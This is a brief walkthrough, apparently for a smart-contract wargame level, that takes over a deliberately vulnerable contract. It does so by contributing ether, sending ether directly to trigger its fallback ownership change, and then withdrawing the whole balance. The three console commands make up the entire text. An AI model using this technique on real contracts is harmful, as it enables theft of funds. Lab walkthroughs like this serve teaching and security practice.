* Send some ether via `contract.contribute({from: player,value: toWei("0.000001")})` method.
* Now send some ether via `sendTransaction({from: player,to: instance,value: toWei("0.000001")})` to get the ownership of contract.
* `contract.withdraw()` all the money in the contract.
